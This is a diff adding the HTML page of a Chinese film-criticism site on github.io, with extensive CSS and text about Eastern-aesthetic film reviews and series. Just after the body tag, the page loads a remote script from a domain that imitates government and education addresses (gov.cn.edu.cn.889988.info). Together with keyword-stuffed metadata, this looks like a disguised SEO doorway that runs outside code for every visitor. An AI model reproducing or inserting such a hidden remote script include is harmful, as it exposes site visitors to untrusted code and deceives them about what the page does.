@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UACompatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>精东影视｜东方美学影视志 · 华语佳作 / 影像评论 / 放映现场 | jingdongyingshi-top.github.io</title>
+<meta name="keywords" content="精东影视, jingdongyingshi, 东方美学影视, 华语电影, 影像评论, 放映现场, 精东影视jingdongyingshi">
+<meta name="description" content="精东影视（jingdongyingshi-top.github.io）是一份专注东方美学的影像志：记录华语佳作、影像评论与放映现场，以东方审美视角解读光影艺术，为影迷提供有温度的影视内容。">
+<meta name="author" content="精东影视">
+<meta name="theme-color" content="#1a1a1a">
+<meta property="og:title" content="精东影视｜东方美学影视志">
+<meta property="og:description" content="专注东方美学的影像志：华语佳作、影像评论、放映现场">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="精东影视">
+<meta property="og:url" content="https://jingdongyingshi-top.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="精东影视｜东方美学影视志">
+<meta name="twitter:description" content="以东方审美视角解读光影艺术">
+<link rel="canonical" href="https://jingdongyingshi-top.github.io">
+<style>
+/* ===== Reset ===== */
+*,*::before,*::after{box-sizing:border-box;}
+html,body,h1,h2,h3,h4,h5,p,ul,li,a,div,section,header,footer,nav,figure,figcaption,span,table,tbody,tr,td,th,i,b{margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"PingFang SC","Songti SC","STSong","Noto Serif CJK SC","SimSun",serif;
+  background:#f6f3ec; color:#1a1a1a; line-height:2; font-size:15px;
+}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+:root{
+  --ink:#1a1a1a; --seal:#a62424; --seal2:#8c1c1c; --gold:#b08d57; --paper:#f6f3ec;
+  --paper2:#efe9df; --line:#d8cfc0; --grey:#8a8378; --blue:#2c4a5e;
+}
+
+/* ===== Paper texture ===== */
+body::before{content:"";position:fixed;inset:0;z-index:-1;opacity:.5;
+  background:
+    radial-gradient(circle at 20% 30%,rgba(176,141,87,.08),transparent 45%),
+    radial-gradient(circle at 80% 70%,rgba(166,36,36,.05),transparent 50%),
+    var(--paper);}
+
+/* ===== Top seal bar ===== */
+.sealbar{background:var(--ink);color:#e8e2d6;padding:10px 0;border-bottom:1px solid var(--seal);}
+.sealbar-in{max-width:1200px;margin:0 auto;padding:0 32px;display:flex;justify-content:space-between;align-items:center;font-size:.72rem;letter-spacing:.18em;font-family:"PingFang SC",sans-serif;}
+.sealbar-in .url{color:var(--gold);}
+.sealbar-in .url b{color:#e8c07a;font-weight:400;}
+
+/* ===== Vertical masthead ===== */
+.masthead{background:var(--paper);border-bottom:1px solid var(--line);padding:64px 0 40px;}
+.mast-in{max-width:1200px;margin:0 auto;padding:0 32px;display:grid;grid-template-columns:auto 1fr;gap:52px;align-items:center;}
+.brand-vert{display:flex;flex-direction:row-reverse;gap:14px;align-items:flex-start;}
+.brand-name{writing-mode:vertical-rl;font-size:clamp(2.6rem,7vw,4.4rem);font-weight:900;letter-spacing:.32em;line-height:1.15;color:var(--ink);}
+.brand-name i{color:var(--seal);font-style:normal;}
+.seal{width:74px;height:74px;border:3px solid var(--seal);border-radius:6px;color:var(--seal);
+  display:flex;align-items:center;justify-content:center;font-size:1.5rem;font-weight:900;
+  writing-mode:vertical-rl;letter-spacing:.05em;flex-shrink:0;margin-top:6px;
+  box-shadow:inset 0 0 0 4px var(--paper),inset 0 0 0 5px var(--seal);}
+.mast-txt{max-width:620px;}
+.mast-txt .sub{font-size:.78rem;letter-spacing:.42em;color:var(--seal);margin-bottom:18px;font-family:"PingFang SC",sans-serif;}
+.mast-txt h2{font-size:1.05rem;font-weight:400;color:var(--grey);line-height:2.1;max-width:560px;letter-spacing:.02em;}
+.mast-txt .rule{width:120px;height:2px;background:var(--seal);margin:22px 0;}
+
+/* ===== Nav ===== */
+nav{background:var(--paper2);border-bottom:2px solid var(--ink);position:sticky;top:0;z-index:99;}
+.nav-in{max-width:1200px;margin:0 auto;padding:0 32px;display:flex;align-items:center;justify-content:space-between;position:relative;height:58px;}
+.brand-min{font-weight:900;font-size:1.15rem;letter-spacing:.14em;}
+.brand-min i{color:var(--seal);font-style:normal;}
+.menu-btn{display:none;background:none;border:0;font-size:1.6rem;cursor:pointer;color:var(--ink);}
+.nav-links{display:flex;gap:0;}
+.nav-links a{padding:18px 20px;font-size:.86rem;letter-spacing:.1em;color:var(--ink);border-left:1px solid var(--line);transition:.2s;font-family:"PingFang SC",sans-serif;}
+.nav-links a:last-child{border-right:1px solid var(--line);}
+.nav-links a:hover,.nav-links a.on{background:var(--seal);color:#fff;}
+
+/* ===== Section heads ===== */
+section{padding:88px 0;}
+.sec-h{display:grid;grid-template-columns:auto 1fr;gap:40px;align-items:start;margin-bottom:52px;}
+.sec-h .cn{display:flex;flex-direction:column;align-items:center;gap:12px;min-width:120px;}
+.sec-h .cn b{font-size:clamp(1.8rem,4vw,2.6rem);font-weight:900;line-height:1.2;}
+.sec-h .cn span{font-size:.72rem;letter-spacing:.3em;color:var(--seal);writing-mode:vertical-rl;font-family:"PingFang SC",sans-serif;}
+.sec-h .txt h3{font-size:clamp(1.5rem,3.4vw,2.2rem);font-weight:900;line-height:1.5;letter-spacing:.02em;}
+.sec-h .txt p{color:var(--grey);font-size:.92rem;margin-top:12px;max-width:660px;line-height:2.05;}
+.sec-h .txt .line{width:64px;height:3px;background:var(--seal);margin:18px 0;}
+
+/* ===== Ink painting cover ===== */
+.cover{background:var(--ink);color:#e8e2d6;padding:0;border-bottom:1px solid var(--line);}
+.cover-in{max-width:1200px;margin:0 auto;padding:72px 32px;display:grid;grid-template-columns:1fr 1fr;gap:0;align-items:stretch;}
+.cover-l{padding-right:56px;border-right:1px solid #333;}
+.cover-l .kicker{font-size:.74rem;letter-spacing:.4em;color:var(--gold);margin-bottom:22px;font-family:"PingFang SC",sans-serif;}
+.cover-l h2{font-size:clamp(2rem,5vw,3.4rem);font-weight:900;line-height:1.5;letter-spacing:.04em;}
+.cover-l h2 em{color:var(--seal);font-style:normal;}
+.cover-l p{margin-top:28px;color:#a89f91;font-size:1rem;line-height:2.15;max-width:440px;}
+.cover-l .sign{margin-top:36px;display:flex;align-items:center;gap:16px;font-size:.82rem;color:var(--gold);}
+.cover-l .sign .stemp{width:52px;height:52px;border:2px solid var(--seal);border-radius:4px;color:var(--seal);display:flex;align-items:center;justify-content:center;font-size:1rem;font-weight:900;writing-mode:vertical-rl;}
+.cover-r{padding-left:56px;display:grid;grid-template-rows:auto 1fr;gap:28px;}
+.brush{height:180px;background:
+  radial-gradient(ellipse at 30% 70%,rgba(232,226,214,.22),transparent 55%),
+  radial-gradient(ellipse at 72% 40%,rgba(232,226,214,.14),transparent 50%),
+  linear-gradient(180deg,#1a1a1a,#222);
+  border:1px solid #333;position:relative;overflow:hidden;}
+.brush::after{content:"";position:absolute;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,255,255,.015) 3px,rgba(255,255,255,.015) 6px);}
+.quote{font-size:1.5rem;line-height:2.2;letter-spacing:.06em;color:#e8e2d6;font-weight:700;position:relative;padding-left:26px;}
+.quote::before{content:"「";position:absolute;left:0;top:-12px;font-size:2.6rem;color:var(--seal);line-height:1;}
+.quote cite{display:block;margin-top:18px;font-size:.8rem;color:var(--gold);font-style:normal;letter-spacing:.16em;font-family:"PingFang SC",sans-serif;}
+
+/* ===== Columns ===== */
+.cols{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-top:2px solid var(--ink);border-bottom:2px solid var(--ink);}
+.col-item{padding:34px 26px;border-right:1px solid var(--line);position:relative;transition:.4s;cursor:default;}
+.col-item:last-child{border-right:none;}
+.col-item:hover{background:var(--ink);color:#e8e2d6;}
+.col-item:hover .num{color:var(--seal);}
+.col-item:hover .cn2{color:var(--gold);}
+.col-item .num{font-size:2.4rem;font-weight:900;color:var(--line);line-height:1;transition:.4s;font-family:"PingFang SC",sans-serif;}
+.col-item h4{font-size:1.2rem;font-weight:900;margin:20px 0 10px;letter-spacing:.06em;}
+.col-item .cn2{font-size:.72rem;letter-spacing:.28em;color:var(--seal);margin-bottom:14px;font-family:"PingFang SC",sans-serif;transition:.4s;}
+.col-item p{font-size:.82rem;color:var(--grey);line-height:1.95;transition:.4s;}
+.col-item:hover p{color:#a89f91;}
+
+/* ===== Scroll (vertical list) ===== */
+.scroll-list{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line);border:1px solid var(--line);}
+.scroll-item{background:var(--paper);padding:30px 28px;display:grid;grid-template-columns:56px 1fr;gap:20px;transition:.3s;}
+.scroll-item:hover{background:#fff;}
+.scroll-item .circle{width:52px;height:52px;border-radius:50%;border:2px solid var(--seal);color:var(--seal);
+  display:flex;align-items:center;justify-content:center;font-size:1rem;font-weight:900;flex-shrink:0;font-family:"PingFang SC",sans-serif;}
+.scroll-item h4{font-size:1.1rem;font-weight:900;margin-bottom:8px;}
+.scroll-item p{font-size:.85rem;color:var(--grey);line-height:1.95;}
+.scroll-item .tag{margin-top:12px;font-size:.7rem;letter-spacing:.16em;color:var(--gold);font-family:"PingFang SC",sans-serif;}
+
+/* ===== Poem / philosophy ===== */
+.philo{background:var(--paper2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);}
+.philo-in{max-width:900px;margin:0 auto;padding:0 32px;text-align:center;}
+.philo-in .big{font-size:clamp(1.4rem,3.4vw,2.1rem);line-height:2.6;letter-spacing:.1em;color:var(--ink);}
+.philo-in .big i{color:var(--seal);font-style:normal;}
+.philo-in .from{margin-top:32px;font-size:.78rem;letter-spacing:.32em;color:var(--gold);font-family:"PingFang SC",sans-serif;}
+
+/* ===== Couplet (两栏对联) ===== */
+.couplet{display:grid;grid-template-columns:repeat(3,1fr);gap:28px;}
+.coup-card{border:1px solid var(--ink);background:var(--paper);padding:0;transition:.4s;}
+.coup-card:hover{box-shadow:-10px 10px 0 var(--seal);}
+.cc-head{background:var(--seal);color:#f6f3ec;padding:14px 20px;display:flex;justify-content:space-between;align-items:center;}
+.cc-head h4{font-size:1rem;font-weight:900;letter-spacing:.08em;}
+.cc-head span{font-size:.7rem;letter-spacing:.16em;opacity:.9;}
+.cc-body{padding:26px 22px;}
+.cc-body ul{font-size:.9rem;line-height:2.5;}
+.cc-body li{padding-left:20px;position:relative;border-bottom:1px dotted var(--line);}
+.cc-body li:last-child{border-bottom:none;}
+.cc-body li::before{content:"•";position:absolute;left:0;color:var(--seal);font-size:1.2rem;line-height:1;}
+.cc-body li a:hover{color:var(--seal2);}
+
+/* ===== Ink wash CTA ===== */
+.inkcta{background:var(--ink);color:#e8e2d6;padding:88px 32px;text-align:center;border-top:4px double var(--gold);border-bottom:4px double var(--gold);position:relative;overflow:hidden;}
+.inkcta::before{content:"";position:absolute;inset:0;opacity:.35;
+  background:radial-gradient(ellipse at 50% 120%,rgba(166,36,36,.35),transparent 60%);}
+.inkcta-in{max-width:760px;margin:0 auto;position:relative;}
+.inkcta h2{font-size:clamp(1.8rem,4.6vw,3rem);font-weight:900;line-height:1.7;letter-spacing:.06em;}
+.inkcta .seal-big{display:inline-block;margin:32px auto 0;width:96px;height:96px;border:3px solid var(--seal);border-radius:8px;color:var(--seal);
+  font-size:1.9rem;font-weight:900;display:flex;align-items:center;justify-content:center;writing-mode:vertical-rl;letter-spacing:.06em;
+  box-shadow:inset 0 0 0 5px var(--ink),inset 0 0 0 7px var(--seal);}
+.inkcta .url{margin-top:30px;font-size:1.05rem;color:var(--gold);letter-spacing:.06em;}
+
+/* ===== Footer ===== */
+.foot{background:var(--paper2);padding:64px 0 32px;border-top:1px solid var(--line);}
+.foot-in{max-width:1200px;margin:0 auto;padding:0 32px;}
+.foot-grid{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:44px;margin-bottom:48px;}
+.foot-brand h3{font-size:1.7rem;font-weight:900;letter-spacing:.16em;margin-bottom:16px;}
+.foot-brand h3 i{color:var(--seal);font-style:normal;}
+.foot-brand p{font-size:.88rem;color:var(--grey);line-height:2.1;max-width:360px;}
+.foot-col h5{font-size:.74rem;letter-spacing:.28em;color:var(--seal);margin-bottom:18px;font-weight:900;font-family:"PingFang SC",sans-serif;}
+.foot-col li{margin-bottom:11px;}
+.foot-col a{font-size:.88rem;color:#4a463e;transition:.2s;}
+.foot-col a:hover{color:var(--seal);}
+.foot-bar{border-top:1px solid var(--line);padding-top:24px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;font-size:.78rem;color:var(--grey);}
+.foot-bar a{color:var(--seal);}
+
+/* ===== Responsive ===== */
+@media(max-width:940px){
+  .mast-in{grid-template-columns:1fr;gap:32px;}
+  .cover-in,.cols,.couplet,.foot-grid{grid-template-columns:1fr 1fr;}
+  .cover-l{border-right:none;border-bottom:1px solid #333;padding:0 0 44px;}
+  .cover-r{padding:44px 0 0;}
+  .brand-vert{flex-direction:row;align-items:center;}
+  .brand-name{writing-mode:horizontal-tb;letter-spacing:.16em;}
+  .seal{width:60px;height:60px;font-size:1.1rem;writing-mode:horizontal-tb;}
+  .col-item{border-right:none;border-bottom:1px solid var(--line);}
+  .col-item:last-child{border-bottom:none;}
+  .scroll-list{grid-template-columns:1fr;}
+  .sec-h{grid-template-columns:1fr;gap:18px;}
+  .sec-h .cn{flex-direction:row;}
+  .sec-h .cn span{writing-mode:horizontal-tb;}
+  .sealbar-in{flex-direction:column;gap:6px;align-items:flex-start;padding:8px 32px;}
+}
+@media(max-width:600px){
+  .cover-in,.cols,.couplet,.foot-grid{grid-template-columns:1fr;}
+  .couplet{gap:20px;}
+  section{padding:60px 0;}
+  .nav-links{display:none;position:absolute;top:58px;left:0;right:0;background:var(--paper2);flex-direction:column;border-bottom:1px solid var(--line);}
+  .nav-links.open{display:flex;}
+  .nav-links a{border-left:none;border-bottom:1px solid var(--line);padding:14px 32px;}
+  .nav-links a:last-child{border-right:none;}
+  .menu-btn{display:block;}
+  .philo-in .big{line-height:2.3;}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- Seal bar -->
+<div class="sealbar">
+  <div class="sealbar-in">
+    <span>东方美学影像志 · 华语佳作 / 影像评论 / 放映现场</span>
+    <span class="url">官方入口：<b>jingdongyingshi-top.github.io</b></span>
+  </div>
+</div>
+
+<!-- Masthead -->
+<header class="masthead">
+  <div class="mast-in">
+    <div class="brand-vert">
+      <div class="brand-name">精东<i>影</i>视</div>
+      <div class="seal">精東</div>
+    </div>
+    <div class="mast-txt">
+      <div class="sub">JINGDONG YINGSHI · 光影志</div>
+      <h2>以东方审美为尺，丈量每一寸光影。精东影视专注华语影像的记录与解读，在快节奏的时代里，为每一部值得被看见的作品留下注脚。</h2>
+      <div class="rule"></div>
+      <div style="font-size:.82rem;color:var(--grey);letter-spacing:.08em;">影像志 · 评论 · 放映 · 对话</div>
+    </div>
+  </div>
+</header>
+
+<!-- Nav -->
+<nav>
+  <div class="nav-in">
+    <div class="brand-min">精东<i>影</i>视</div>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+    <div class="nav-links" id="navLinks">
+      <a href="#top" class="on">卷首</a>
+      <a href="#cover">本期</a>
+      <a href="#col">栏目</a>
+      <a href="#scroll">连载</a>
+      <a href="#philo">立场</a>
+      <a href="#couplet">索引</a>
+    </div>
+  </div>
+</nav>
+
+<!-- Cover / brush painting -->
+<section class="cover" id="cover">
+  <div class="cover-in">
+    <div class="cover-l">
+      <div class="kicker">本期卷首 · FEATURE</div>
+      <h2>光影有骨，<br><em>东方</em>有神。</h2>
+      <p>精东影视jingdongyingshi 的影像观察，不只谈论剧情与票房，更在意镜头里的留白、构图里的气韵，以及那些藏在细节中的东方表达。</p>
+      <div class="sign"><div class="stemp">精東</div><span>主编寄语 · 光影志编辑部</span></div>
+    </div>
+    <div class="cover-r">
+      <div class="brush"></div>
+      <div class="quote">一部好的电影，像一幅留白得当的水墨——<br>不说满，才看得久。
+        <cite>— 精东影视 · 影像评论栏目</cite>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Columns -->
+<section id="col">
+  <div class="wrap" style="max-width:1200px;margin:0 auto;padding:0 32px;">
+    <div class="sec-h">
+      <div class="cn"><b>栏目</b><span>SECTIONS</span></div>
+      <div class="txt">
+        <h3>四大常设栏目，各有章法</h3>
+        <div class="line"></div>
+        <p>精东影视的栏目设置遵循"观、评、录、谈"四条线索，分别对应影像观察、评论写作、放映记录与人物对话。</p>
+      </div>
+    </div>
+    <div class="cols">
+      <div class="col-item"><div class="num">壹</div><div class="cn2">OBSERVE</div><h4>影像观察</h4><p>关注华语新片与经典回望，梳理镜头语言、叙事结构与美学取向。</p></div>
+      <div class="col-item"><div class="num">贰</div><div class="cn2">CRITIQUE</div><h4>评论写作</h4><p>不赶热度、不做快评，以长文形式深入解读作品的内核与表达。</p></div>
+      <div class="col-item"><div class="num">叁</div><div class="cn2">SCREENING</div><h4>放映记录</h4><p>记录影展、专题放映与私人观影清单，整理可复用的观片路径。</p></div>
+      <div class="col-item"><div class="num">肆</div><div class="cn2">DIALOGUE</div><h4>人物对话</h4><p>与创作者、策展人与资深影迷的对谈，还原作品背后的思考过程。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- Scroll list -->
+<section id="scroll" style="background:var(--paper2);border-top:1px solid var(--line);">
+  <div class="wrap" style="max-width:1200px;margin:0 auto;padding:0 32px;">
+    <div class="sec-h">
+      <div class="cn"><b>连载</b><span>SERIES</span></div>
+      <div class="txt">
+        <h3>近期连载 · 正在更新</h3>
+        <div class="line"></div>
+        <p>精东影视jingdongyingshi 的系列专题，按主题长期连载，每期聚焦一个方向持续深入。</p>
+      </div>
+    </div>
+    <div class="scroll-list">
+      <div class="scroll-item"><div class="circle">卷</div><div><h4>华语新导演观察</h4><p>跟踪近年华语新导演的创作轨迹，从短片到长片的成长路径与风格建立。</p><div class="tag">连载中 · 第 07 期</div></div></div>
+      <div class="scroll-item"><div class="circle">卷</div><div><h4>镜头里的东方色彩</h4><p>从服化道到光影调度，拆解东方美学在当代影视中的具体呈现方式。</p><div class="tag">连载中 · 第 12 期</div></div></div>
+      <div class="scroll-item"><div class="circle">卷</div><div><h4>独立放映现场</h4><p>记录各地独立影展与主题放映现场，呈现不同于院线的观影生态。</p><div class="tag">连载中 · 第 05 期</div></div></div>
+      <div class="scroll-item"><div class="circle">卷</div><div><h4>老片新读</h4><p>以当下的视角重读经典影片，发现曾被忽略的细节与时代印记。</p><div class="tag">连载中 · 第 09 期</div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- Philosophy -->
+<section id="philo" class="philo">
+  <div class="philo-in">
+    <div class="sec-h" style="justify-content:center;margin-bottom:40px;">
+      <div class="cn" style="margin:0 auto;"><b>立场</b><span>ETHOS</span></div>
+    </div>
+    <div class="big">我们不追逐流量，<i>只记录光影</i>；<br>不贩卖情绪，只提供视角。<br>精东影视，是一个慢一点的影像角落。</div>
+    <div class="from">— 光影志编辑部 · 写在创刊之初</div>
+  </div>
+</section>
+
+<!-- Couplet / index -->
+<section id="couplet">
+  <div class="wrap" style="max-width:1200px;margin:0 auto;padding:0 32px;">
+    <div class="sec-h">
+      <div class="cn"><b>索引</b><span>INDEX</span></div>
+      <div class="txt">
+        <h3>内容索引 · 按需取阅</h3>
+        <div class="line"></div>
+        <p>精东影视yingshicang 的内容归档索引，按题材与形态分组，方便快速定位感兴趣的方向。</p>
+      </div>
+    </div>
+    <div class="couplet">
+      <div class="coup-card">
+        <div class="cc-head"><h4>题材</h4><span>GENRE</span></div>
+        <div class="cc-body"><ul>
+          <li><a href="#col">家庭伦理</a></li>
+          <li><a href="#col">历史人文</a></li>
+          <li><a href="#col">都市情感</a></li>
+          <li><a href="#col">乡土现实</a></li>
+          <li><a href="#col">悬疑犯罪</a></li>
+        </ul></div>
+      </div>
+      <div class="coup-card">
+        <div class="cc-head"><h4>形态</h4><span>FORM</span></div>
+        <div class="cc-body"><ul>
+          <li><a href="#col">剧情长片</a></li>
+          <li><a href="#col">纪录影像</a></li>
+          <li><a href="#col">短片合集</a></li>
+          <li><a href="#col">剧集观察</a></li>
+          <li><a href="#col">动画与实验</a></li>
+        </ul></div>
+      </div>
+      <div class="coup-card">
+        <div class="cc-head"><h4>场景</h4><span>MOOD</span></div>
+        <div class="cc-body"><ul>
+          <li><a href="#col">午后慢看</a></li>
+          <li><a href="#col">深夜细品</a></li>
+          <li><a href="#col">合家共赏</a></li>
+          <li><a href="#col">友人共论</a></li>
+          <li><a href="#col">旅途随身</a></li>
+        </ul></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Ink CTA -->
+<section class="inkcta">
+  <div class="inkcta-in">
+    <h2>光影有骨，东方有神。<br>精东影视，静候每一场相遇。</h2>
+    <div class="seal-big">精東</div>
+    <div class="url">jingdongyingshi-top.github.io</div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="foot">
+  <div class="foot-in">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <h3>精东<i>影</i>视</h3>
+        <p>东方美学影像志，精东影视jingdongyingshi 记录华语佳作、影像评论与放映现场，以东方审美视角解读光影艺术。</p>
+      </div>
+      <div class="foot-col">
+        <h5>栏目</h5>
+        <ul><li><a href="#col">影像观察</a></li><li><a href="#col">评论写作</a></li><li><a href="#col">放映记录</a></li><li><a href="#col">人物对话</a></li></ul>
+      </div>
+      <div class="foot-col">
+        <h5>连载</h5>
+        <ul><li><a href="#scroll">华语新导演</a></li><li><a href="#scroll">东方色彩</a></li><li><a href="#scroll">放映现场</a></li><li><a href="#scroll">老片新读</a></li></ul>
+      </div>
+      <div class="foot-col">
+        <h5>关于</h5>
+        <ul><li><a href="#philo">编辑立场</a></li><li><a href="#couplet">内容索引</a></li><li><a href="#top">返回卷首</a></li></ul>
+      </div>
+    </div>
+    <div class="foot-bar">
+      <span>© 2026 精东影视 · 东方美学影像志 · 保留所有权利</span>
+      <span>官方站点：<a href="https://jingdongyingshi-top.github.io">https://jingdongyingshi-top.github.io</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var btn=document.getElementById('menuBtn'),box=document.getElementById('navLinks');
+btn.addEventListener('click',function(){box.classList.toggle('open');});
+document.querySelectorAll('.nav-links a').forEach(function(a){
+  a.addEventListener('click',function(){box.classList.remove('open');});
+});
+var navAs=document.querySelectorAll('.nav-links a');
+var secs=['cover','col','scroll','philo','couplet'];
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+150,cur='top';
+  secs.forEach(function(s){var el=document.getElementById(s);if(el&&el.offsetTop<=y)cur=s;});
+  navAs.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur||(cur==='top'&&a.getAttribute('href')==='#top'));});
+});
+</script>
+</body>
+</html>
